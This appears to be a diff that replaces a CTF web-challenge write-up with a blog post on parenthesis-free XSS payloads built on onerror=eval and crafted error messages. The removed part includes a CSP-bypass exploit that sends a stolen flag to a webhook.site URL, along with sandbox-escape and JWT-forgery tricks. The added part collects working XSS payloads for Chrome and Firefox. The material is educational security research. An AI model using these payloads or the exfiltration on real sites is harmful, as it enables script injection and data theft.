@@ -1,218 +1,152 @@
-### Canvas (4 solves)
-
-This challenge is very interesting!
-
-In simple terms, it throws your code into a worker to execute it. Inside the worker, there are some protective measures that prevent you from accessing `globalThis`. Even if you manage to get XSS within the worker, the only thing you can do is post a message to the main thread. However, the result goes through `setHTML` and is filtered by the browser's Sanitizer API.
-
-The worker's sandbox is quite interesting. It looks something like this:
+Recently, I saw Gareth Heyes [tweet](https://x.com/garethheyes/status/1961078705293246513) that Firefox is going to remove this feature: [Firefox removed support for throwing error-like objects](https://github.com/PortSwigger/xss-cheatsheet-data/issues/103), so he found a new method:
 
 ``` js
-function allKeys(obj) {
-  let keys = []
-  while (obj !== null) {
-    keys = keys.concat(Object.getOwnPropertyNames(obj))
-    keys = keys.concat(Object.keys(Object.getOwnPropertyDescriptors(obj)))
-    obj = Object.getPrototypeOf(obj)
-  }
-  return [...new Set(keys)]
-}
-
-function hardening() {
-  const fnCons = [function () {}, async function () {}, function* () {}, async function* () {}].map(
-    f => f.constructor
-  )
-  for (const c of fnCons) {
-    Object.defineProperty(c.prototype, 'constructor', {
-      get: function () {
-        throw new Error('Nope')
-      },
-      set: function () {
-        throw new Error('Nope')
-      },
-      configurable: false
-    })
-  }
-  const cons = [Object, Array, Number, String, Boolean, Date, RegExp, Promise, Symbol, BigInt].concat(fnCons)
-  for (const c of cons) {
-    Object.freeze(c)
-    Object.freeze(c.prototype)
-  }
-}
-
-const code = `console.log(1)`
-const argNames = allKeys(globalThis)
-const fn = Function(...argNames, code)
-const callUserFn = t => {
-  try {
-    fn.apply(Object.create(null))
-  } catch (e) {
-    console.error('User function error', e)
-  }
-  return true
-}
-
-// hardening
-hardening()
-callUserFn()
+throw onerror=eval,x=new Error,x.message='alert\x281\x29',x
 ```
 
-`argNames` collects the names of everything that `global` can access. This way, all the names can be treated as function parameters. It feels something like this:
+It seems that if you want to create a new Error, you can do it without parentheses. After creating an Error object, you can set the message, and you can still control the error message.
+
+## Other payloads
+
+There are other payloads mentioned by others in the original post.
+
+The first one comes from [@terjanq](https://x.com/terjanq/status/1128692453047975936):
 
 ``` js
-function run(console, Object, String, Number, fetch,...) {
-    
-}
+throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337,3331,117]+a[13]
 ```
 
-So, no matter what you get, it will be `undefined`. When calling, `this` is also passed as `Object.create(null)`, so it's not easy to escape.
+I tried this payload, and it currently only works in Chrome. It can clearly be broken down into several parts:
 
-Maple's expected solution involves using try-catch and throwing an error to retrieve the value:
+1. `/a/`
+2. `Uncaught=1`
+3. `g=alert`
+4. `a=URL+0`
+5. `onerror=eval`
+6. `throw /1/g+a[12]+[1337,3331,117]+a[13]`
+
+Because it is connected by commas, the part that gets thrown will be the last segment.
+
+Let's start with the last segment. What does `throw /1/g+a[12]+[1337,3331,117]+a[13]` do?
+
+First, `a` is `URL+0`, and `URL` is a global function. The function + 0 will become a string, so `a` is `"function URL() { [native code] }0"`, thus `a[12]` and `a[13]` are `(` and `)` respectively.
+
+The `/1/g` is a regexp, and when it becomes a string, it will be `"/1/g"`. As for the array `[1337,3331,117]`, when converted to a string, it will call `join`, resulting in `"1337,3331,117"`.
+
+Putting it all together, `/1/g+a[12]+[1337,3331,117]+a[13]` will be `/1/g(1337,3331,117)`.
+
+Combined with what was mentioned earlier, the error message thrown will be:
+
+```
+Uncaught /1/g(1337,3331,117)
+```
+
+Here, the `/` was previously treated as a regexp, but in the current code, it actually represents arithmetic division, i.e., `a / b / c`, where `a` is `Uncaught`, `b` is `1`, and `c` is `g(1337,3331,117)`.
+
+If `Uncaught` is not declared, it will throw an error, which is why `Uncaught=1` is needed. Then `g` will be treated as a function, so `g=alert`.
+
+What about the first line `/a/`? This is likely just to prevent a space between `throw` and the subsequent payload, and it doesn't serve any other purpose.
+
+The essence of this solution lies in making the error message become `Uncaught /1/g(1337,3331,117)` when thrown, which is a valid piece of code. As long as some prerequisites are fulfilled, it can successfully call the function `g`.
+
+The second one comes from [@cgvwzq](https://x.com/cgvwzq):
 
 ``` js
-try {
-  null.f()
-} catch (e) {
-  TypeError = e.constructor
-}
-Error = TypeError.prototype.__proto__.constructor
-Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
-try{
-  null.f()
-} catch(e) {
-  const g = e.stack[2].getFunction().arguments[0].target
-  if (g) { throw { message: g } }
-}
+TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']
 ```
 
-He used a similar technique before in the DiceCTF 2022 - undefined challenge.
+This is actually divided into two statements. The first statement is: `TypeError.prototype.name ='=/'`, which forcibly changes the name of `TypeError` to `=/`.
 
-However, there is an easier solution for this challenge, utilizing the default behavior of `this`, as shown below:
+Without this line, the error message for `0[0]['test']` would be: `Uncaught TypeError: Cannot read properties of undefined (reading 'test')`.
+
+`0[0]` will be undefined, and `undefined['test']` will throw this TypeError.
+
+After we forcibly change the name:
 
 ``` js
-function a() {
-   this.console.log('hello') 
-}
-a()
+TypeError.prototype.name ='hello!';
+0[0]['test'];
+// Uncaught hello!: Cannot read properties of undefined (reading 'test')
 ```
 
-In JavaScript, when calling a function, the default `this` will be the global object. By using this, you can bypass restrictions.
+We can control the original part of `TypeError` to become any string.
 
-But what can you do after bypassing the restrictions? It seems that you can't do much in the worker because the main thread's `setHTML` filters the content, and the CSP of this challenge is `default-src 'self' 'unsafe-eval'`.
+The other statement `0[onerror=eval]['/-alert(1)//']` simply places the assignment inside `[]`. After the assignment, it is equivalent to `0[eval]`, which will return undefined, thus throwing a TypeError.
 
-The key lies in the blob URL. You can create a new HTML using blob and load it. The origin of this new HTML is the same as the original one:
+Let's look at it another way, with the following code:
 
 ``` js
-const u = this.URL.createObjectURL(new this.Blob(['<h1>peko</h1>'], { type: 'text/html' }))
-location = u
+TypeError.prototype.name ='{1}';
+0[eval]['{2}'];
 ```
 
-What surprised me about this challenge is that the `<meta>` redirect can also be redirected to a blob URL. So, by combining meta redirect, you can make the top-level page your own HTML and bypass the sanitizer's restrictions.
-
-However, at this point, the CSP is inherited, so you still need to bypass the CSP. Here, you can use `worker.js` again, load it as a regular script, and execute XSS under the main thread.
-
-This challenge is really interesting, and the use of blob is quite clever.
-
-### AMF (4 solves)
-
-I'm a bit lazy to study Python stuff, so I'll leave it for now. The author has written a writeup.
-
-### Harmony (2 solves)
-
-This challenge involves various Electron black magic.
-
-In Chromium, domains ending with `.localhost` are ignored when using the file protocol, for example:
+The error message generated in Chrome would be:
 
 ```
-// fail
-file://www.youtube.com.attacker.com/etc/passwd
-
-// success
-file://www.youtube.com.localhost/etc/passwd
+Uncaught {1}: can't access property "{2}", 0[eval] is undefined
 ```
 
-(I feel like I accidentally came across this code before)
+Now the problem becomes how to control the string above to make the error message a valid piece of code?
 
-And `file://` is filtered out by DOMPurify, but since the webpage itself is a file, you can change it to use `//` to bypass the check.
+In place of `{1}`, the author placed `=/`, resulting in `Uncaught=/`. This `/` actually means regexp, so the idea of this method is to make the string before `{2}` (`: can't access property "` ) become part of the regexp.
 
-Next, `file://` is same-origin in Electron, so after loading your own file, you can access `top.api`.
+Thus, the beginning of `{2}` is `/`, forming a regexp with the preceding part, and then using `-alert(1)` to execute the function. It can also be changed to `+alert(1)`, as it just needs to string the two operations together. After execution, the subsequent code is all commented out with `//`, so it can be ignored.
 
-Finally, by combining some prototype pollution techniques, you can achieve RCE (I didn't study the second half in detail, you can refer to the author's writeup).
-
-### Sharer's World (1 solve)
-
-The key to this challenge is something called SXG: https://web.dev/signed-exchanges/
-
-I had never heard of this before this competition, and it turns out that the reference material on web.dev was available as early as 2021. It seems like I've been lagging behind for too long.
-
-Simply put, SXG allows you to sign a webpage with a certificate. When other websites send this signed resource, the browser treats it as if it is from the certified website.
-
-For example, suppose someone from example.com signs a webpage with their private key, creating an example.sxg file. Then I get this file and put it on my server with the URL: https://huli.tw/example.sxg
-
-When a user visits https://huli.tw/example.sxg, the content will be the previous website, and the URL will become example.com, as if this webpage came directly from example.com.
-
-## SECCON CTF 2023
-
-As a JavaScript enthusiast, I really liked the challenges in this SECCON CTF. They were full of JavaScript. Although I couldn't solve some of the challenges, I still learned a lot.
-
-### Bad JWT (107 solves)
-
-The goal of this challenge is to generate a JWT with `isAdmin: true`. The key lies in the logic of JWT verification:
+However, if you actually run the above payload, you will find that Chrome returns the error message: `Invalid regular expression ... Unterminated group`. This is because there is a `(` in the error message, which may not have been there, causing the regexp syntax to be incorrect. You just need to add a `)` to fix it:
 
 ``` js
-const algorithms = {
-  hs256: (data, secret) => 
-    base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
-  hs512: (data, secret) => 
-    base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
-}
-
-const createSignature = (header, payload, secret) => {
-  const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
-  const signature = algorithms[header.alg.toLowerCase()](data, secret);
-  return signature;
-}
+TypeError.prototype.name ='=/',0[onerror=eval][')/-alert(1)//']
 ```
 
-If `header.alg` is `constructor`, it becomes `const signature = Object(data,secret)`, and the resulting signature becomes a string object that only contains data, ignoring the secret:
+The generated error message will be:
 
 ``` js
-console.log(Object("data", "secret")) // String {'data'}
+Uncaught =/: Cannot read properties of undefined (reading ')/-alert(1)//')
 ```
 
-Therefore, you just need to construct a signature that is the same.
-
-For a more detailed writeup, you can refer to: https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023
-
-### SimpleCalc (23 solves)
-
-This question allows you to execute arbitrary JavaScript, but you need to use fetch with the X-FLAG header to get the flag. However, it will be blocked by CSP:
-
-```  js
-app.use((req, res, next) => {
-  const js_url = new URL(`http://${req.hostname}:${PORT}/js/index.js`);
-  res.header('Content-Security-Policy', `default-src ${js_url} 'unsafe-eval';`);
-  next();
-});
-```
-
-By creating a response with a header that is too large and embedding it in an iframe, you can obtain a same-origin page without CSP, bypassing CSP:
+A simplified version would be:
 
 ``` js
-var f=document.createElement('iframe');
-f.src = `http://localhost:3000/js/index.js?q=${'a'.repeat(20000)}`;
-document.body.appendChild(f);
-f.onload = () => {    
-    f.contentWindow.fetch('/flag', { headers: {'X-FLAG': 'a'}, credentials:'include' })
-        .then(res => res.text())
-        .then(flag => location='https://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q='+flag)
-}
+Uncaught =/regexp/-alert(1)//...
 ```
 
-Interestingly, using `window.open` does not work. It is said that window.open will redirect the error page to a place like `chrome://error`, so the origin becomes null.
+By the way, this payload works fine on Chrome 139, but Firefox 142 will throw an error: `Uncaught SyntaxError: expected expression, got '='`.
 
-The expected solution for this question is actually a service worker. It can be used under http + localhost to remove the CSP header by relying on the service worker.
+If you want to debug, just change `onerror=eval` to `onerror=console.log` to see what the generated error message looks like:
 
-Below is @DimasMaulana's exploit:
+```
+=/: can't access property ")//alert(1)//", 0[console.log] is undefined
+```
 
-```py
-from urllib.parse import quote
+It seems that in Firefox, there is nothing in front of the TypeError's name, so to make it work in Firefox, you can just add any character that can be a variable in front:
+
+```js
+TypeError.prototype.name ='a=/',0[onerror=eval]['/-alert(1)//']
+```
+
+If you really understand this approach, you can actually insert code at the TypeName part by following this idea, resulting in the same outcome, but not that cool (it works fine on Chrome):
+
+``` js
+TypeError.prototype.name ='=alert(1)//',0[onerror=eval][2]
+```
+
+As for how to construct a payload that works on both Chrome and Firefox, readers can practice on their own or refer to an example I created, which adds some variations:
+
+``` js
+TypeError.prototype.name ='+/[',[onerror=eval][window.Uncaught++][']/-alert\501\51<!--']
+```
+
+## Summary
+
+In fact, regardless of which payload it is, the core concept is the same: just turn the error message into valid JavaScript code and pass it to eval for execution.
+
+To understand the payload, you need to be somewhat familiar with JavaScript code, such as `0[onerror=eval]` or the use of commas; you should at least know what’s going on.
+
+Besides that, it’s about using your imagination, which is harder to practice and usually starts with observation and imitation.
+
+Finally, here are a few key points:
+
+1. Commas can chain multiple expressions, returning the last one.
+2. Replacing onerror with eval allows you to execute the error message as code.
+3. Errors thrown will become part of the error message.
+4. As long as you can turn the error message into valid code, you’ve succeeded.
